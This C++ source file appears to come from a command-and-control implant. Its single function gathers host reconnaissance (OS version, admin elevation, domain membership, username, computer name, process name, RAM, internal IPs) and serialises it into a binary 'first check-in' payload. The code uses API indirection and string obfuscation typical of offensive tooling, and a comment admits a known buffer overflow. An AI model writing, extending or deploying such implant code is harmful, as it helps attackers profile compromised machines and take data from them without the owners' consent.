// -- gatherSystemInfo ----------------------------------------------------
// Collect system information into a binary payload for the first check-in.
// Extracted from net_abstract.cpp to reduce the monolith.
#include "../../include/network/net_abstract.h"
#include "../../include/network/net_internal.h"
#include "../../include/utils.h"
#include "../../libs/bastia/bastia.h"

// -- gatherSystemInfo ------------------------------------------------
// Collect system information into a binary payload for the first check-in.
//
// Binary layout (all fields packed, strings are variable-length UTF-8):
//   [4] os_major        (PEB->OSMajorVersion)
//   [4] os_minor        (PEB->OSMinorVersion)
//   [4] os_build        (PEB->OSBuildNumber)
//   [2] arch            (IMAGE_FILE_MACHINE_*)
//   [1] is_wow64
//   [1] is_elevated     (TokenElevation)
//   [1] is_domain_joined (ComputerNameDnsDomain succeeds with non-empty result)
//   [4] pid
//   [2] process_name_len
//   [..] process_name
//   [2] username_len
//   [..] username
//   [2] computer_name_len
//   [..] computer_name
//   [2] domain_len
//   [..] domain
//   [4] ram_mb
//   [1] cpu_cores
//   [1] ip_count
//   [..] ip_count * { [1] len, [len] addr }  (dotted-decimal UTF-8)
//
// Returns a heap-allocated buffer (caller must __free), or NULL on failure.
// Sets *out_len to the total byte count.
char* gatherSystemInfo(size_t* out_len) {
    if (!g_state.nt || !out_len) return nullptr;

    // -- Temporary wide-string buffers --
    const size_t WBUF_MAX = 512;
    wchar_t* tmp_w = (wchar_t*)__malloc(WBUF_MAX * sizeof(wchar_t));
    if (!tmp_w) return nullptr;

    // -- Read OS version directly from PEB (no API call needed) --
    #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
    #else
        PPEB peb = (PPEB)__readfsdword(0x30);
    #endif
    uint32_t os_major = (uint32_t)peb->OSMajorVersion;
    uint32_t os_minor = (uint32_t)peb->OSMinorVersion;
    uint32_t os_build = (uint32_t)peb->OSBuildNumber;

    // -- Architecture --
    SYSTEM_INFO si = {};
    g_state.nt->GetSystemInfo(&si);
    auto arch = (uint16_t)si.wProcessorArchitecture;
    auto cpu_cores = (uint8_t)peb->NumberOfProcessors;

    // -- WoW64 --
    uint8_t is_wow64 = 0;
    if (g_state.nt->IsWow64Process) {
        int wow64 = 0;  // Use int directly to avoid BOOL type issues
        if (g_state.nt->IsWow64Process(NtCurrentProcess(), (PBOOL)&wow64)) {
            is_wow64 = (uint8_t)(wow64 ? 1 : 0);
        }
    }

    // -- Token Elevation (admin check) --
    // maybe this is better as a bof...
    uint8_t is_elevated = 0;
    REQUIRES_MODULE(g_state.nt, ModuleCache::Module::ADVAPI32);
    if (g_state.nt->OpenProcessToken && g_state.nt->GetTokenInformation) {
        HANDLE hToken = NULL;
        if (g_state.nt->OpenProcessToken((HANDLE)-1, TOKEN_QUERY /* TOKEN_QUERY */, &hToken)) {
            TOKEN_ELEVATION te;
            DWORD retLen = 0;
            if (g_state.nt->GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)TokenElevation /* TokenElevation */, &te, sizeof(te), &retLen)) {
                is_elevated = (uint8_t)(te.TokenIsElevated ? 1 : 0);
            }
            g_state.nt->NtClose(hToken);
        }
    }

    // -- Domain-joined detection --
    uint8_t is_domain_joined = 0;
    DWORD domain_len_w = WBUF_MAX;
    {
        if (g_state.nt->GetComputerNameExW((COMPUTER_NAME_FORMAT)ComputerNameDnsDomain, tmp_w, &domain_len_w)) {
            if (domain_len_w > 0 && tmp_w[0] != L'\0') {
                is_domain_joined = 1;
            }
        }
    }

    // -- PID --
    uint32_t pid = (uint32_t)(uintptr_t)__getCurrentProcessID();

    // -- Process name. convert to UTF-8 via __wcstombs
    DWORD proc_name_len = WBUF_MAX;
    char* proc_name_utf8 = nullptr;
    size_t proc_name_len_utf8 = 0;
    {
        // Extract just the filename from ImagePathName (strip path)
        const wchar_t* imgPath = peb->ProcessParameters->ImagePathName.Buffer;
        size_t imgPathLen = peb->ProcessParameters->ImagePathName.Length / sizeof(wchar_t);
        const wchar_t* proc_basename = imgPath;
        for (size_t i = 0; i < imgPathLen; i++) {
            if (imgPath[i] == L'\\' || imgPath[i] == L'/') {
                proc_basename = imgPath + i + 1;
            }
        }
        size_t wlen = __wcslen(proc_basename);
        size_t max_out = wlen * 3 + 1;  // UTF-8 worst case
        proc_name_utf8 = (char*)__malloc(max_out);
        if (proc_name_utf8) {
            __wcstombs(proc_name_utf8, proc_basename, max_out);
            proc_name_len_utf8 = __strlen(proc_name_utf8);
        }
    }
    if (!proc_name_utf8) {
        proc_name_utf8 = (char*)__malloc(1);
        if (proc_name_utf8) proc_name_utf8[0] = '\0';
    }

    // -- Username --
    DWORD user_len = WBUF_MAX;
    char* username_utf8 = nullptr;
    size_t username_len_utf8 = 0;
    if (g_state.nt->GetUserNameW(tmp_w, &user_len)) {
        size_t wlen = __wcslen(tmp_w);
        size_t max_out = wlen * 3 + 1;
        username_utf8 = (char*)__malloc(max_out);
        if (username_utf8) {
            __wcstombs(username_utf8, tmp_w, max_out);
            username_len_utf8 = __strlen(username_utf8);
        }
    }
    if (!username_utf8) {
        username_utf8 = (char*)__malloc(1);
        if (username_utf8) username_utf8[0] = '\0';
    }

    // -- Computer name --
    DWORD comp_name_len = WBUF_MAX;
    char* compname_utf8 = nullptr;
    size_t compname_len_utf8 = 0;
    if (g_state.nt->GetComputerNameW(tmp_w, &comp_name_len)) {
        size_t wlen = __wcslen(tmp_w);
        size_t max_out = wlen * 3 + 1;
        compname_utf8 = (char*)__malloc(max_out);
        if (compname_utf8) {
            __wcstombs(compname_utf8, tmp_w, max_out);
            compname_len_utf8 = __strlen(compname_utf8);
        }
    }
    if (!compname_utf8) {
        compname_utf8 = (char*)__malloc(1);
        if (compname_utf8) compname_utf8[0] = '\0';
    }

    // -- Domain name
    wchar_t* domain_w = (wchar_t*)__malloc(WBUF_MAX * sizeof(wchar_t));
    char* domain_utf8 = nullptr;
    size_t domain_len_utf8 = 0;
    if (domain_w) {
        if (g_state.nt->GetComputerNameExW) {
            DWORD dns_domain_len = WBUF_MAX;
            if (g_state.nt->GetComputerNameExW((COMPUTER_NAME_FORMAT)2 /* ComputerNameDnsDomain */, domain_w, &dns_domain_len)) {
                size_t wlen = __wcslen(domain_w);
                size_t max_out = wlen * 3 + 1;
                domain_utf8 = (char*)__malloc(max_out);
                if (domain_utf8) {
                    __wcstombs(domain_utf8, domain_w, max_out);
                    domain_len_utf8 = __strlen(domain_utf8);
                }
            }
        }
    }
    if (!domain_utf8) {
        domain_utf8 = (char*)__malloc(1);
        if (domain_utf8) domain_utf8[0] = '\0';
    }
    if (domain_w) __free(domain_w);
    domain_w = NULL;

    // -- RAM (MB) --
    uint32_t ram_mb = 0;
    {
        MEMORYSTATUSEX ms = {};
        ms.dwLength = sizeof(ms);
        if (g_state.nt->GlobalMemoryStatusEx(&ms)) {
            ram_mb = (uint32_t)(ms.ullTotalPhys >> 20);
        }
    }

    // -- Internal IPs --
    // Collect IPv4 addresses (skip loopback, link-local, APIPA).
    struct IpEntry {
        char addr[16];  // "255.255.255.255\0". This will DEFINITELY overflow if we try to put IPv6 in here, but the spec is for IPv4 only so... tough luck.
                        // Honestly don't think i'll fix it, but a very, very funny problem nonetheless.
                        //                                                                      - Serexp
        uint8_t len;
    };
    IpEntry* ips = (IpEntry*)__malloc(16 * sizeof(IpEntry));  // max 16 IPs
    uint8_t ip_count = 0;

    REQUIRES_MODULE(g_state.nt, ModuleCache::Module::IPHLPAPI);
    if (g_state.nt->GetAdaptersAddresses && ips) {
        ULONG buf_len = 15 * 1024;  // 15 KB should be enough
        PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)__malloc(buf_len);
        if (adapters) {
            ULONG res = g_state.nt->GetAdaptersAddresses(
                AF_INET /* AF_INET */,
                0x0004 | 0x0002, /* GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST */
                NULL,
                adapters,
                &buf_len
            );
            if (res == 0 /* NO_ERROR */) {
                for (PIP_ADAPTER_ADDRESSES adap = adapters; adap && ip_count < 16; adap = adap->Next) {
                    // Skip loopback
                    if (adap->IfType == 24 /* IF_TYPE_SOFTWARE_LOOPBACK */) continue;

                    for (PIP_ADAPTER_UNICAST_ADDRESS_LH uc = adap->FirstUnicastAddress; uc && ip_count < 16; uc = uc->Next) {
                        /* i honestly forgot what this code does but it works so glhf */
                        if (uc->Address.lpSockaddr && uc->Address.iSockaddrLength >= sizeof(SOCKADDR_IN)) {
                            SOCKADDR_IN* sin = (SOCKADDR_IN*)uc->Address.lpSockaddr;
                            uint32_t ip32 = sin->sin_addr.S_un.S_addr;
                            // Skip 127.0.0.0/8, 169.254.0.0/16 (APIPA), 0.0.0.0
                            uint8_t b0 = (uint8_t)(ip32 & 0xFF);
                            uint8_t b1 = (uint8_t)((ip32 >> 8) & 0xFF);
                            if (b0 == 127 || b0 == 0) continue;
                            if (b0 == 169 && b1 == 254) continue;

                            IpEntry* e = &ips[ip_count];
                            e->len = (uint8_t)__snprintf(e->addr, sizeof(e->addr), lcg_encrypt("%u.%u.%u.%u"),
                                b0, b1,
                                (uint8_t)((ip32 >> 16) & 0xFF),
                                (uint8_t)((ip32 >> 24) & 0xFF));
                            if (e->len > 0 && e->len < sizeof(e->addr)) {
                                ip_count++;
                            }
                        }
                    }
                }
            }
            __free(adapters);
        }
    }

    // Calculate total size
    size_t total = 4+4+4 + 2+1+1+1 + 4  // fixed fields
                 + 2 + proc_name_len_utf8
                 + 2 + username_len_utf8
                 + 2 + compname_len_utf8
                 + 2 + domain_len_utf8
                 + 4 + 1  // ram_mb, cpu_cores
                 + 1;     // ip_count
    for (uint8_t i = 0; i < ip_count; i++) {
        total += 1 + ips[i].len;
    }

    char* payload = (char*)__malloc(total);
    if (!payload) {
        if (proc_name_utf8) __free(proc_name_utf8);
        if (username_utf8) __free(username_utf8);
        if (compname_utf8) __free(compname_utf8);
        if (domain_utf8) __free(domain_utf8);
        if (ips) __free(ips);
        if (domain_w) __free(domain_w);
        if (tmp_w) __free(tmp_w);
        *out_len = 0;
        return nullptr;
    }

    // Serialize
    size_t off = 0;
    __memcpy(payload + off, &os_major, 4); off += 4;
    __memcpy(payload + off, &os_minor, 4); off += 4;
    __memcpy(payload + off, &os_build, 4); off += 4;
    __memcpy(payload + off, &arch, 2); off += 2;
    __memcpy(payload + off, &is_wow64, 1); off += 1;
    __memcpy(payload + off, &is_elevated, 1); off += 1;
    __memcpy(payload + off, &is_domain_joined, 1); off += 1;
    __memcpy(payload + off, &pid, 4); off += 4;

    uint16_t len16 = (uint16_t)proc_name_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (proc_name_len_utf8) { __memcpy(payload + off, proc_name_utf8, proc_name_len_utf8); off += proc_name_len_utf8; }

    len16 = (uint16_t)username_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (username_len_utf8) { __memcpy(payload + off, username_utf8, username_len_utf8); off += username_len_utf8; }

    len16 = (uint16_t)compname_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (compname_len_utf8) { __memcpy(payload + off, compname_utf8, compname_len_utf8); off += compname_len_utf8; }

    len16 = (uint16_t)domain_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (domain_len_utf8) { __memcpy(payload + off, domain_utf8, domain_len_utf8); off += domain_len_utf8; }

    __memcpy(payload + off, &ram_mb, 4); off += 4;
    __memcpy(payload + off, &cpu_cores, 1); off += 1;
    __memcpy(payload + off, &ip_count, 1); off += 1;
    for (uint8_t i = 0; i < ip_count; i++) {
        __memcpy(payload + off, &ips[i].len, 1); off += 1;
        __memcpy(payload + off, ips[i].addr, ips[i].len); off += ips[i].len;
    }

    *out_len = total;

    // Cleanup temporaries
    if (proc_name_utf8) __free(proc_name_utf8);
    if (username_utf8) __free(username_utf8);
    if (compname_utf8) __free(compname_utf8);
    if (domain_utf8) __free(domain_utf8);
    if (ips) __free(ips);
    /* domain_w already freed inline above */
    if (tmp_w) __free(tmp_w);

    return payload;
}
